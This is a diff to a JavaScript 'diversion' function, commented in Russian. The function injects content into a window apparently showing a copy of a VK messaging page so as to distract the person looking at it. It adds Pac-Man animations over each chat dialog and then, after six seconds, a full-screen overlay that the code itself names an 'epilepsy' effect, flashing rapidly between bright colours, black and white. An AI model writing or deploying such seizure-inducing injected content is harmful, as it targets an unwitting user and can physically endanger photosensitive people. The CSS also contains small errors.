@@ -84,22 +84,9 @@ function diversion() {
 
     // когда новое окно загрузится выполняем скрипт, который отвлечет человека
     setTimeout(() => {
-        // let current = 0;
-        // // когда новое окно загрузится выполняем скрипт, который отвлечет человека
-        // setInterval(() => {
-        //     if (current === 4) vkCopy.document.body.style.cssText = "background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSp3TM1puW0YH1z7Jnee4aNjx4-xasgeTdAzQ&usqp=CAU') no-repeat center !important; background-size: cover !important";
-        //     else if (current === 3) vkCopy.document.body.style.cssText = "background: red !important";
-        //     else if (current === 2) vkCopy.document.body.style.cssText = "background: blue !important";
-        //     else if (current === 1) vkCopy.document.body.style.cssText = "background: green !important";
-        //     else if (current === 0) vkCopy.document.body.style.cssText = "background: url('https://www.proplan.ru/sites/owners.proplan.ru/files/2020-03/shutterstock_1036161856.jpg') no-repeat center !important; background-size: cover !important";
+        // ========== ДОБАВЛЯЕМ ПАКМАНА НА СТРАНИЦУ ==========
 
-        //     current++;
-        //     if (current > 4) current = 0;
-        // }, 100);
-
-        // ========== ADD PACKMAN TO THE PAGE ==========
-
-        // styles for packman
+        // стили для пакмана
         let styles = `
         .pacman-wrapper{
             position: relative;
@@ -173,13 +160,15 @@ function diversion() {
           }
         `;
 
-        // now add our styles to style tag and thenin html
+        // добавляем стили в тег style, а затем в head
         let styleSheet = vkCopy.document.createElement("style");
         styleSheet.type = "text/css";
         styleSheet.innerText = styles;
         vkCopy.document.head.appendChild(styleSheet);
 
+        // получаем все эелменты с диалогами
         vkCopy.document.querySelectorAll('.nim-dialog').forEach((dialogElem, i) => {
+            // каждые 2 секунды выпускаем кракена
             setTimeout(function () {
                 dialogElem.innerHTML += `<div class="pacman-wrapper">
                                             <div class="pacman">
@@ -190,23 +179,114 @@ function diversion() {
             }, i * 2000);
         });
 
+
+        // добавляем эффект эпилепсии через 6 секунд
+        setTimeout(() => {
+            let styles_epilepsy = `
+                .epilepsy {
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100vw;
+                    height: 100vh;
+                    animation-name:epilepsy;
+                    animation-duration: 1s;
+                    animation-iteration-count: infinite;
+                    background-repeat: no-repeat;
+                    background-size: cover;
+                }
+
+                @keyframes epilepsy {
+                    0% {
+                        background: #39ff14;
+                    }
+                    5% {
+                        background: black;
+                    }
+                    10% {
+                        background: ##ff0000;
+                    }
+                    15% {
+                        background: black;
+                    }
+                    20% {
+                        background: white;
+                    }
+                    25% {
+                        background: black;
+                    }
+                    30% {
+                        background: #003cff;
+                    }
+                    35% {
+                        background: white;
+                    }
+                    40% {
+                        background: black;
+                    }
+                    47% {
+                        background: white;
+                    }
+                    48% {
+                        background: black;
+                    }
+                    45% {
+                        background: white;
+                    }
+                    49% {
+                        background: #39ff14;
+                    }
+                    50% {
+                        background: url(https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSp3TM1puW0YH1z7Jnee4aNjx4-xasgeTdAzQ&usqp=CAU)
+                    }
+                    60% {
+                        background: black;
+                    }
+                    62% {
+                        background: white;
+                    }
+                    62% {
+                        background: magenta;
+                    }
+                    64% {
+                        background: #39ff14;
+                    }
+                    66% {
+                        background: gray;
+                    }
+                    68% {
+                        background: blue;
+                    }
+                    70% {
+                        background: magenta;
+                    }
+                    75% {
+                        background: white;
+                    }
+                    80% {
+                        background: #fc0349;
+                    }
+                    90% {
+                        background: linear-gradient(90deg, rgba(255,0,0,1) 0%, rgba(0,0,0,1) 19%, rgba(255,0,0,1) 50%, rgba(0,0,0,1) 64%, rgba(246,0,0,1) 83%, rgba(0,0,0,1) 89%);
+                    }
+                    100% {
+                        background: #15ff00;
+                    }
+                }
+
+            `;
+
+            // добавляем стили в тег style, а затем в head
+            let styleSheet_epilepsy = vkCopy.document.createElement("style");
+            styleSheet_epilepsy.type = "text/css";
+            styleSheet_epilepsy.innerText = styles_epilepsy;
+            vkCopy.document.body.appendChild(styleSheet_epilepsy);
+
+            let epilepsy_bg = vkCopy.document.createElement('div');
+            epilepsy_bg.classList.add('epilepsy');
+            vkCopy.document.body.appendChild(epilepsy_bg);
+        }, 6000);
     }, 5000);
-
-    // vkCopy.addEventListener('load', () => {
-    //     let toggle = true;
-    //     vkCopy.alert(123);
-
-    //     setInterval(function () {
-    //         if (toggle) vkCopy.document.body.background = "url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSp3TM1puW0YH1z7Jnee4aNjx4-xasgeTdAzQ&usqp=CAU')";
-    //         else vkCopy.document.body.background = "red";
-    //         toggle = !toggle;
-    //     }, 500);
-    // });
-
-    // setTimeout(function () {
-    //     vkCopy.document.body.appendChild(vkCopy.document.createElement('div'));
-    //     console.log('New script appended!');
-    // }, 5000);
 }
 // ================= ОТВЛЕЧЕНИЕ ================== //
 
